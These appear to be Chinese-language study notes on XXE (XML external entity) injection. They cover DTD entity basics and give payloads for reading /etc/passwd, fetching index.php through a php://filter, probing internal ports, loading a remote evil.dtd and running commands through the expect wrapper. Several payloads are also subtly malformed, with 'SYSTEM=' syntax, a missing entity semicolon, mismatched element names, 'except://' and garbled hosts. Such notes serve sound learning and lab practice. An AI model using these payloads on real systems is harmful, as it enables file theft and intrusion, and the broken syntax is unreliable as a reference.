[c0ny1/xxe-lab: 一个包含php,java,python,C#等各种语言版本的XXE漏洞Demo](https://github.com/c0ny1/xxe-lab)
[[web安全原理分析]-XEE漏洞入门 - 笑花大王 - 博客园](https://www.cnblogs.com/xhds/p/12327732.html)
[浅谈XML实体注入漏洞 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/175451.html)
XEE——XML External Entity Injection XML外部实体注入 
XML——eXtensible Markup Language 可扩展标记语言
    配置文件
    交换数据
    ![](图片/Pasted%20image%2020241118110457.png)
DTD—— Document Type Definition  文档类型定

ElEMENT——元素 [DTD 元素 | 菜鸟教程](https://www.runoob.com/dtd/dtd-elements.html)
ENTITY——实体 [DTD 实体 | 菜鸟教程](https://www.runoob.com/dtd/dtd-entities.html)
    内部声明
        `<!ENTITY entity-name "entity-value">`
        DTD 实例:  
             `<!ENTITY writer "Donald Duck.">  
            `<!ENTITY copyright "Copyright runoob.com">  
        XML 实例：  
            `<author>&writer;&copyright;</author>`
    外部声明
        `<!ENTITY entity-name SYSTEM "URI/URL">`
            DTD 实例: 
                `<!ENTITY writer SYSTEM "http://www.runoob.com/entities.dtd">`
                `<!ENTITY copyright SYSTEM "http://www.runoob.com/entities.dtd">`
            XML 实例： 
                `<author>&writer;&copyright;</author>`
外部声明引用：协议
    file file:///etc//passwd
    php php://filter/read=convert.base64 encode/resource=index.php 
    http http//:wuya.com/evil.dtd
![](图片/Pasted%20image%2020241118111733.png)


可以实现
文件读取
payload

```c
并非c只是为了高亮
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE creds[
<!ELEMENT userename ANY>
<!ELEMENT password ANY>
<!ENTITY xxe SYSTEM="file:///etc/passwd"]>
<creds>
    <username>&xxe</username>
    <password>test</password>
</creds>
```

内网探测
利用xxe漏洞进行内网探测，如果端口开启，请求返回的时间会很快，如果端口关闭请求返回的时间会很慢
```c
并非c只是为了高亮
<?xml version="1.0"?>
<!DOCTYPE creds[
<!ELEMENT userename ANY>
<!ELEMENT password ANY>
<!ENTITY xxe SYSTEM="http://127.0.0.1.22"]>
<creds>
    <username>&xxe</username>
    <password>test</password>
</creds>
```



命令执行
[PHP伪协议](PHP伪协议.md)
```c
并非c只是为了高亮
<?xml version="1.0"?>
<!DOCTYPE creds[
<!ELEMENT userename ANY>
<!ELEMENT password ANY>
<!ENTITY xxe SYSTEM="except://id"]>
<creds>
    <username>&xxe</username>
    <password>test</password>
</creds>
```



```c
并非c只是为了高亮
<!-- XML声明(定义了XML的版本和编码) -->
<?xml version="1.0" encoding="ISO-8859-1"?>

<!-- 文档类型定义 -->
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)> 
  <!ELEMENT to      (#PCDATA)>           <!-- 定义to元素为#PCDATA类型  -->
  <!ELEMENT from    (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body    (#PCDATA)>
]>

<!-- 文档元素 -->
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note>

```


[一个靶场](http://web.jarvisoj.com:9882)
